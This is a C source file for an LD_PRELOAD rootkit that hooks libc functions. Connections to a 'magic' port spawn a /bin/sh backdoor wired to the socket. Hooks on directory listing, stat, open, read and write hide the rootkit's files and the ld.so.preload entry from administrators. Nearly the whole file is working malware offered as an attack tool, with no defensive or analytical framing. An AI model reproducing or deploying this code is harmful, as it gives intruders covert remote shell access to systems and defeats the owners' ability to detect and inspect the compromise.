#include "rootkit.h"


static void *get_orig(const char *name) {
    return dlsym(RTLD_NEXT, name);
}

static int is_stealth_active(void) {
    return 0;
}

static int is_hidden(const char *name) {
    if (!name) return 0;
    if (strstr(name, HIDDEN_PREFIX)) return 1;
    if (strstr(name, EVIL_LIB)) return 1;
    if (strstr(name, "ld.so.preload")) return 1;
    return 0;
}
// track connections
static int handling_magic_port = 0;

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    orig_bind_t orig = (orig_bind_t)get_orig("bind");

    if (addr && addr->sa_family == AF_INET && !is_stealth_active()) {
        struct sockaddr_in *s = (struct sockaddr_in *)addr;
        if (ntohs(s->sin_port) == MAGIC_PORT) {

            handling_magic_port = 1;
            errno = 0;
            return 0;
        }
    }

    return orig(sockfd, addr, addrlen);
}

int accept(int fd, struct sockaddr *sa, socklen_t *len) {
    orig_accept_t orig = get_orig("accept");

    // Check if this socket is bound to our magic port
    struct sockaddr_in local_addr;
    socklen_t addrlen = sizeof(local_addr);

    if (getsockname(fd, (struct sockaddr *)&local_addr, &addrlen) == 0) {
        if (local_addr.sin_family == AF_INET &&
            ntohs(local_addr.sin_port) == MAGIC_PORT) {

            // This is our magic port - accept the connection
            int cfd = orig(fd, sa, len);
            if (cfd >= 0) {
                // Spawn shell
                if (fork() == 0) {
                    // Child process - redirect stdio to socket
                    dup2(cfd, 0);
                    dup2(cfd, 1);
                    dup2(cfd, 2);
                    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                    exit(0);
                }
                // Parent process - close and hide the connection
                close(cfd);
                return -1;
            }
        }
    }

    // Normal accept for other ports
    return orig(fd, sa, len);
}

// Hook accept4() - same as accept() but with flags
int accept4(int fd, struct sockaddr *sa, socklen_t *len, int flags) {
    orig_accept4_func_type orig = (orig_accept4_func_type)get_orig("accept4");

    // Check if this socket is bound to our magic port
    struct sockaddr_in local_addr;
    socklen_t addrlen = sizeof(local_addr);

    if (getsockname(fd, (struct sockaddr *)&local_addr, &addrlen) == 0) {
        if (local_addr.sin_family == AF_INET &&
            ntohs(local_addr.sin_port) == MAGIC_PORT) {

            // This is our magic port - accept the connection
            int cfd = orig(fd, sa, len, flags);
            if (cfd >= 0) {
                // Spawn shell
                if (fork() == 0) {
                    dup2(cfd, 0);
                    dup2(cfd, 1);
                    dup2(cfd, 2);
                    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                    exit(0);
                }
                close(cfd);
                return -1;
            }
        }
    }

    return orig(fd, sa, len, flags);
}

struct dirent *readdir(DIR *dirp) {
    if (is_stealth_active()) return ((orig_readdir_t)get_orig("readdir"))(dirp);
    orig_readdir_t orig = get_orig("readdir");
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (!is_hidden(e->d_name)) return e;
    }
    return NULL;
}

ssize_t read(int fd, void *buf, size_t count) {
    orig_read_t orig = get_orig("read");
    ssize_t n = orig(fd, buf, count);
    if (n > 0 && !is_stealth_active()) {
        if (memmem(buf, n, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
            memmem(buf, n, EVIL_LIB, strlen(EVIL_LIB))) {
            memset(buf, 0, n);
        }
    }
    return n;
}

int __xstat(int ver, const char *path, struct stat *buf) {
    orig_xstat_t orig = get_orig("__xstat");
    if (!is_stealth_active() && is_hidden(path)) {
        int r = orig(ver, path, buf);
        buf->st_size = 0;
        return r;
    }
    return orig(ver, path, buf);
}

int stat(const char *path, struct stat *buf) {
    orig_stat_t orig = get_orig("stat");
    if (!is_stealth_active() && is_hidden(path)) {
        int r = orig(path, buf);
        buf->st_size = 0;
        return r;
    }
    return orig(path, buf);
}

int open(const char *path, int flags, ...) {
    orig_open_t orig = get_orig("open");
    const char *new_path = path;
    if (!is_stealth_active() && is_hidden(path)) new_path = "/dev/null";

    if (flags & O_CREAT) {
        va_list a; va_start(a, flags);
        mode_t m = va_arg(a, mode_t);
        va_end(a);
        return orig(new_path, flags, m);
    }
    return orig(new_path, flags);
}

ssize_t write(int fd, const void *buf, size_t count) {
    orig_write_t orig = get_orig("write");
    if (!is_stealth_active() && buf && count > 0) {
        if (memmem(buf, count, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
            memmem(buf, count, EVIL_LIB, strlen(EVIL_LIB))) {
            return count;  // Pretend we wrote, but actually block it
        }
    }
    return orig(fd, buf, count);
}